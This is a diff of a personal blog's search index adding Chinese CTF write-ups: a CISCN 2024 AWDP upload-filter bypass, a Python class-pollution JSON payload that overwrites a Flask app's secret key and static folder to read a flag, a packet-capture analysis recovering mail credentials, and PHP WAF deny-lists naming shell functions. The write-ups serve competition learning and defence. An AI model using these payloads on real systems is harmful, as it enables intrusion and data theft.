@@ -1,7 +1,123 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2018信息安全铁人三项数据赛</title>
+    <title>CISCN2024 华东南赛区</title>
+    <url>/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA.html</url>
+    <content><![CDATA[<p>难得带飞学弟，当然要记录一下</p>
+<span id="more"></span>
+
+<h1 id="CISCN2024-华东南赛区"><a href="#CISCN2024-华东南赛区" class="headerlink" title="CISCN2024 华东南赛区"></a>CISCN2024 华东南赛区</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>倒一身份进入华东南分区赛！！比赛前一天准备蛮多东西，一晚上在本地搭建ai模型，又下载一堆工具，对我来说真的蛮紧张的。不过还好超常发挥，做三道web直直直直直接打到15名。后面fix除了那道原型链污染可惜之外，其他拿源码也修不明白呜呜呜。总的来说除了比赛场地非常热之外，分区赛体验感还不错。</p>
+<hr>
+<h2 id="submit"><a href="#submit" class="headerlink" title="submit"></a>submit</h2><h3 id="BREAK"><a href="#BREAK" class="headerlink" title="BREAK"></a>BREAK</h3><p>文件上传功能</p>
+<p>有对php字符进行检测，<code>&lt;=</code>直接绕过</p>
+<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623091443579.png"></p>
+<p>访问文件上传路径，得到flag</p>
+<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623091428121.png"></p>
+<h3 id="FIX"><a href="#FIX" class="headerlink" title="FIX"></a>FIX</h3><p>由于题目要求是png图片，直接加个白名单检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$allowedExtensions = array(&quot;png&quot;);</span><br><span class="line">$extension = pathinfo($_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;], PATHINFO_EXTENSION);</span><br><span class="line">// 检查文件类型是否允许上传</span><br><span class="line">if (!in_array(strtolower($extension), $allowedExtensions)) &#123;</span><br><span class="line">    echo &quot;只允许上传png&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终将upload.php替换就行，不需要重启服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// $path = &quot;./uploads&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">$content = file_get_contents($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">$allow_content_type = array(&quot;image/png&quot;);</span><br><span class="line">$type = $_FILES[&quot;myfile&quot;][&quot;type&quot;];</span><br><span class="line"></span><br><span class="line">//修复部分</span><br><span class="line">$allowedExtensions = array(&quot;png&quot;);</span><br><span class="line">$extension = pathinfo($_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;], PATHINFO_EXTENSION);</span><br><span class="line">// 检查文件类型是否允许上传</span><br><span class="line">if (!in_array(strtolower($extension), $allowedExtensions)) &#123;</span><br><span class="line">    echo &quot;只允许上传png&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">if (!in_array($type, $allow_content_type)) &#123;</span><br><span class="line">    die(&quot;只允许png哦!&lt;br&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/(php|script|xml|user|htaccess)/i&#x27;, $content)) &#123;</span><br><span class="line">    // echo &quot;匹配成功!&quot;;</span><br><span class="line">    die(&#x27;鼠鼠说你的内容不符合哦0-0&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $file = $path . &#x27;/&#x27; . $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;];</span><br><span class="line">echo $file;</span><br><span class="line"></span><br><span class="line">if (move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $file)) &#123;</span><br><span class="line">        file_put_contents($file, $content);</span><br><span class="line">        echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">        echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!----&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Polluted"><a href="#Polluted" class="headerlink" title="Polluted"></a>Polluted</h2><h3 id="BREAK-1"><a href="#BREAK-1" class="headerlink" title="BREAK"></a>BREAK</h3><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, session, redirect, url_for,request,render_template</span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import json</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def generate_random_md5():</span><br><span class="line">    random_string = os.urandom(16)</span><br><span class="line">    md5_hash = hashlib.md5(random_string)</span><br><span class="line"></span><br><span class="line">    return md5_hash.hexdigest()</span><br><span class="line">def filter(user_input):</span><br><span class="line">    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;string&#x27;]</span><br><span class="line">    for pattern in blacklisted_patterns:</span><br><span class="line">        if re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = generate_random_md5()</span><br><span class="line"></span><br><span class="line">class evil():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    username = request.form.get(&#x27;username&#x27;)</span><br><span class="line">    password = request.form.get(&#x27;password&#x27;)</span><br><span class="line">    session[&quot;username&quot;] = username</span><br><span class="line">    session[&quot;password&quot;] = password</span><br><span class="line">    Evil = evil()</span><br><span class="line">    if request.data:</span><br><span class="line">        if filter(str(request.data)):</span><br><span class="line">            return &quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;</span><br><span class="line">        else:</span><br><span class="line">            merge(json.loads(request.data), Evil)</span><br><span class="line">            return &quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def templates():</span><br><span class="line">    username = session.get(&quot;username&quot;, None)</span><br><span class="line">    password = session.get(&quot;password&quot;, None)</span><br><span class="line">    if username and password:</span><br><span class="line">        if username == &quot;adminer&quot; and password == app.secret_key:</span><br><span class="line">            return render_template(&quot;important.html&quot;, flag=open(&quot;/flag&quot;, &quot;rt&quot;).read())</span><br><span class="line">        else:</span><br><span class="line">            return &quot;Unauthorized&quot;</span><br><span class="line">    else:</span><br><span class="line">        return f&#x27;Hello,  This is the POLLUTED page.&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,debug=True, port=80)</span><br></pre></td></tr></table></figure>
+
+<p>存在merge函数那么考点肯定是python原型链污染</p>
+<p>首先定义了<code>secret_key</code>，使用os.urandom函数生成随机数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def generate_random_md5():</span><br><span class="line">    random_string = os.urandom(16)</span><br><span class="line">    md5_hash = hashlib.md5(random_string)</span><br><span class="line">    </span><br><span class="line">app.secret_key = generate_random_md5()</span><br></pre></td></tr></table></figure>
+
+<p>定义了黑名单</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def filter(user_input):</span><br><span class="line">    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;string&#x27;]</span><br><span class="line">    for pattern in blacklisted_patterns:</span><br><span class="line">        if re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            return True</span><br></pre></td></tr></table></figure>
+
+<p>json格式数据可以用unicode编码，所以这里关键字都可以绕过</p>
+<p>定义了evil类，初始化的作用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class evil():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
+
+<p><code>/</code>路由下POST传参</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    username = request.form.get(&#x27;username&#x27;)</span><br><span class="line">    password = request.form.get(&#x27;password&#x27;)</span><br><span class="line">    session[&quot;username&quot;] = username</span><br><span class="line">    session[&quot;password&quot;] = password</span><br><span class="line">    Evil = evil()</span><br><span class="line">    if request.data:</span><br><span class="line">        if filter(str(request.data)):</span><br><span class="line">            return &quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;</span><br><span class="line">        else:</span><br><span class="line">            merge(json.loads(request.data), Evil)</span><br><span class="line">            return &quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>接收username和password，并赋值给session。然后evil初始化，对传参的值黑名单检测（unicode绕过）</p>
+<p>如果未检测到则执行merge函数，存在原型链污染漏洞</p>
+<p><code>/admin</code>路由如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/admin&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def templates():</span><br><span class="line">    username = session.get(&quot;username&quot;, None)</span><br><span class="line">    password = session.get(&quot;password&quot;, None)</span><br><span class="line">    if username and password:</span><br><span class="line">        if username == &quot;adminer&quot; and password == app.secret_key:</span><br><span class="line">            return render_template(&quot;important.html&quot;, flag=open(&quot;/flag&quot;, &quot;rt&quot;).read())</span><br><span class="line">        else:</span><br><span class="line">            return &quot;Unauthorized&quot;</span><br><span class="line">    else:</span><br><span class="line">        return f&#x27;Hello,  This is the POLLUTED page.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>检测session中的username和password是否正确，正确则返回flag</p>
+<p><strong>思路</strong></p>
+<p>由于得到flag的条件非常苛刻，因为我们根本无法确定<code>secret_key</code>的值，所以我们选择污染key，然后利用<code>/</code>路由下的对session赋值，得到<code>adminer:123456</code>的cookie，再拿此cookie去访问<code>/admin</code>即可实现绕过</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">        &quot;app&quot;:&#123;</span><br><span class="line">            &quot;secret_key&quot;:&quot;123456&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编码一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;\u005f\u005fin\u0069t\u005f\u005f&quot;:&#123;</span><br><span class="line">        &quot;\u005f\u005fglob\u0061ls\u005f\u005f&quot;:&#123;</span><br><span class="line">        &quot;\u0061pp&quot;:&#123;</span><br><span class="line">            &quot;secret\u005fkey&quot;:&quot;123456&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>污染成功后，登录<code>adminer:123456</code>拿cookie，然后访问<code>/admin</code></p>
+<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623115809810.png"></p>
+<p>发现没有flag，想到还有个知识点 <code>_static_folder</code>  是用于指定静态文件的存放路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">        &quot;app&quot;:&#123;</span><br><span class="line">            &quot;secret_key&quot;:&quot;123456&quot;,</span><br><span class="line">            &quot;_static_folder&quot;:&quot;/&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编码一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;\u005f\u005fin\u0069t\u005f\u005f&quot;:&#123;</span><br><span class="line">        &quot;\u005f\u005fglob\u0061ls\u005f\u005f&quot;:&#123;</span><br><span class="line">        &quot;\u0061pp&quot;:&#123;</span><br><span class="line">            &quot;secret\u005fkey&quot;:&quot;123456&quot;,</span><br><span class="line">            &quot;\u005fstatic\u005ffolder&quot;:&quot;/&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>污染成功后我们直接访问静态路由<code>10.1.180.19/static/flag</code>，成功拿到flag</p>
+<h3 id="FIX-1"><a href="#FIX-1" class="headerlink" title="FIX"></a>FIX</h3><p>直接添加对unicode的waf，以及读取静态路由的关键字<code>_static_folder</code></p>
+<p>原来黑名单修改一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def filter(user_input):</span><br><span class="line">    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;globals&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;_static_folder&#x27;,&#x27;\u005f&#x27;, &#x27;\u0069&#x27;, &#x27;\u0061&#x27;, &#x27;\u004&#x27;,&#x27;\u0067&#x27;,&#x27;\u006c&#x27;,&#x27;\u006f&#x27;,&#x27;\u0062&#x27;,&#x27;\u0063&#x27;,&#x27;\u0064&#x27;,&#x27;\u006c&#x27;,&#x27;\u0073&#x27;, &#x27;\u0065&#x27;, &#x27;\u0066&#x27;, &#x27;\u0068&#x27;,&#x27;\u0074&#x27;,&#x27;\u006d&#x27;]</span><br><span class="line">    for pattern in blacklisted_patterns:</span><br><span class="line">        if re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br></pre></td></tr></table></figure>
+
+<p>不过一直修到最后一轮还是没成功，赛后才想到不用那么复杂</p>
+<p>对unicode的过滤直接过滤<code>\</code>就行，关键字拆开过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def filter(user_input):</span><br><span class="line">    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;globals&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;static&#x27;, &#x27;folder&#x27;,&#x27;\&#x27;]</span><br><span class="line">    for pattern in blacklisted_patterns:</span><br><span class="line">        if re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br></pre></td></tr></table></figure>
+
+<p>比赛的时候只能说脑袋给烧晕了，最简单的修复都没想到</p>
+]]></content>
+      <categories>
+        <category>CTF比赛</category>
+      </categories>
+      <tags>
+        <tag>线下赛</tag>
+        <tag>CISCN</tag>
+        <tag>原型链污染</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>闽盾杯2024-出题人的上网流量</title>
+    <url>/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F.html</url>
+    <content><![CDATA[<p>新接触流量包的SMTP协议，特此进行分析学习</p>
+<span id="more"></span>
+
+<h1 id="闽盾杯2024-出题人的上网流量"><a href="#闽盾杯2024-出题人的上网流量" class="headerlink" title="闽盾杯2024-出题人的上网流量"></a>闽盾杯2024-出题人的上网流量</h1><p>打开下好的附件，开始是重点对http流量进行分析</p>
+<p>注意到IP为<code>10.50.0.143</code>非常可疑，进行筛选</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==10.50.0.143</span><br></pre></td></tr></table></figure>
+
+<p>往后翻看到有下载图片</p>
+<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623212226001.png"></p>
+<p>追踪tcp流发现回显包是jpg图片，我们直接转原始数据另存为1.jpg文件</p>
+<p>然后010打开去掉jpg文件头前面内容保存</p>
+<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623212403301.png"></p>
+<p>结果三张都是学生证，没啥用</p>
+<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623212546676.png"></p>
+<p>然后翻追踪的流有小一会，注意到第86流有和SMTP邮件协议有关的邮件对话</p>
+<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623212728983.png"></p>
+<p>将那几个base64解码也能得到邮箱以及密码，还有后面的聊天内容</p>
+<p>最重要的是有传递docx文件</p>
+<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623213001968.png"></p>
+<p>经过一番搜索，得知可以将抓的SMTP协议包另存为<code>.eml</code>文件，随便找个能打开邮件的就行</p>
+<p>直接用foxmail打开，可以得到docx文件密码即为qq号</p>
+<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623213125940.png"></p>
+<p>直接去官网找到吴老师的qq号</p>
+<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623213225024.png"></p>
+<p>解开得到flag</p>
+<p><img src="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F/image-20240623213320447.png"></p>
+]]></content>
+      <categories>
+        <category>流量分析</category>
+      </categories>
+      <tags>
+        <tag>SMTP协议</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息安全铁人三项数据赛2018</title>
     <url>/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B.html</url>
     <content><![CDATA[<p>记录一些铁三的流量分析题</p>
 <span id="more"></span>
@@ -100,7 +216,7 @@
       </tags>
   </entry>
   <entry>
-    <title>2024高校网络安全管理运维赛-easyshell</title>
+    <title>高校网络安全管理运维赛2024-easyshell</title>
     <url>/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell.html</url>
     <content><![CDATA[<p>冰蝎流量分析</p>
 <span id="more"></span>
@@ -126,9 +242,9 @@
       </tags>
   </entry>
   <entry>
-    <title>2024高校网络安全管理运维赛-web</title>
+    <title>高校网络安全管理运维赛2024-web</title>
     <url>/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web.html</url>
-    <content><![CDATA[<p>代表福师大参加运维赛，还好最后十分钟解出来pyssrf呜呜呜</p>
+    <content><![CDATA[<p>代表福师大参加运维赛，还好最后十分钟解出来pyssrf拿了个华南赛区二等</p>
 <span id="more"></span>
 
 
@@ -178,7 +294,7 @@
 <p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506194620542.png"></p>
 ]]></content>
       <categories>
-        <category>CTF</category>
+        <category>CTF比赛</category>
       </categories>
       <tags>
         <tag>SSRF</tag>
@@ -313,18 +429,28 @@
       </tags>
   </entry>
   <entry>
-    <title>[CISCN 2024线下赛]备战AWDP</title>
+    <title>[CISCN2024 线下赛]备战AWDP</title>
     <url>/article/CISCN-2024%E7%BA%BF%E4%B8%8B%E8%B5%9B-%E5%A4%87%E6%88%98AWDP.html</url>
-    <content><![CDATA[<p>备战6月22日的CISCN线下赛 AWDP</p>
+    <content><![CDATA[<p>备战6月23日的CISCN线下赛 AWDP</p>
 <span id="more"></span>
 
 <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次CISCN华东南赛区我们学校是承办方，当然晋级名额变成三队，不过由于本人实力有限加上最后黑灯的时候差一点做出来<code>easycms-revenge</code>，本来都打算退役了。在看到主办方发的晋级名单后，发现我们以倒一晋级线下赛，实在是续了下香火。既然都进了，总不能玩几小时pvz吧，所以打算从今天开始备战AWDP</p>
 <h1 id="AWDP"><a href="#AWDP" class="headerlink" title="AWDP"></a>AWDP</h1><p>首先了解一下什么是 AWDP ，AWDP模式（Attack,Defense,WebandPwn），分为 Break 与 Fix 环节。根据英文全称也可以看出来，只有 Web 和 Pwn 这两个方向的题目。</p>
 <p>每个战队拥有相同的起始分数及相同配置的虚拟靶机，参赛队员需对平台中的GameBox发起攻击，向平台提交正确的flag（证明自己具备对该题的攻击能力）；在此期间，由平台以轮次制的方式向参赛战队的靶机发起攻击，检查其他选手的漏洞是否修补成功，若修补成功则认为参赛战队具备该漏洞的防御能力。</p>
 <p>简单来说，AWDP 和传统 CTF 并无任何区别，仅仅是多了一个 Fix 功能，也就是你提交 flag 后拿到的是攻击分，而 Fix 成功后才会拿到防御分。</p>
-<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>AWDP包括攻击和防守，比赛的时候要两边都顾，如果在攻击无果的情况下，可以往修复上看，因为防守成功也会得分。</p>
+<h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><p>这里以xshell和xftp为例</p>
+<p>我们先使用xshell连接服务器，进入到test文件夹</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240622220002576.png" alt="image-20240622220002576"></p>
+<p>然后新建一个shell，点击新建文件传输</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240622220558021.png" alt="image-20240622220558021"></p>
+<p>然后自动弹出来xftp，添加会话连接</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240622220708827.png" alt="image-20240622220708827"></p>
+<p>连接好后，右键对应文件点击传输即可</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240622220815691.png" alt="image-20240622220815691"></p>
 <h1 id="防守WAF"><a href="#防守WAF" class="headerlink" title="防守WAF"></a>防守WAF</h1><p><a href="https://github.com/Drun1baby/JavaSecFilters/tree/main/PHP">参考文章</a></p>
 <h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafrce($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|tail|flag|exec|base64|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (preg_match(&#x27;/(system|exec|shell_exec|passthru|eval|assert)/i&#x27;, $_GET[&#x27;do&#x27;])) &#123;</span><br><span class="line">        die(&#x27;hacker&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    return $_GET[&#x27;do&#x27;];</span><br></pre></td></tr></table></figure>
 
 <h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function wafsqli($str)&#123;</span><br><span class="line">    return !preg_match(&quot;/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|\&quot;|\&#x27;|\^|\|/i&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -334,20 +460,13 @@
 
 <h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xmlData = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">$xml = simplexml_load_string($xmlData);</span><br><span class="line">echo $xml-&gt;name;</span><br></pre></td></tr></table></figure>
 
-
-
-
-
-
-
-<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="自定义过滤关键词"><a href="#自定义过滤关键词" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter_list = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;]</span><br><span class="line">strings = &quot;ana&quot;  # 匹配包含&quot;ana&quot;的字符串</span><br><span class="line">for i in filter_list:</span><br><span class="line">    if i in strings:</span><br><span class="line">        print(&quot;Hacker!&quot; )</span><br></pre></td></tr></table></figure>
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>自定义过滤关键词</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter_list = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;]</span><br><span class="line">strings = &quot;ana&quot;  # 匹配包含&quot;ana&quot;的字符串</span><br><span class="line">for i in filter_list:</span><br><span class="line">    if i in strings:</span><br><span class="line">        print(&quot;Hacker!&quot; )</span><br></pre></td></tr></table></figure>
 
 <h2 id="Nodejs"><a href="#Nodejs" class="headerlink" title="Nodejs"></a>Nodejs</h2><p>自定义过滤关键词</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const keywords = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;];</span><br><span class="line"></span><br><span class="line">for (const i of keywords) &#123;</span><br><span class="line">    if (code.includes(i)) &#123;</span><br><span class="line">        console.log(&quot;Hacker!&quot;) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
-
-<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h3 id="自定义过滤关键词-1"><a href="#自定义过滤关键词-1" class="headerlink" title="自定义过滤关键词"></a>自定义过滤关键词</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String[] filterList = &#123;&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;&#125;;</span><br><span class="line">String str = &quot;ana&quot;; // 匹配包含&quot;ana&quot;的字符串</span><br><span class="line"></span><br><span class="line">for (String s : filterList) &#123;</span><br><span class="line">    if (s.contains(str)) &#123;</span><br><span class="line">        System.out.println(&quot;Hacker!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
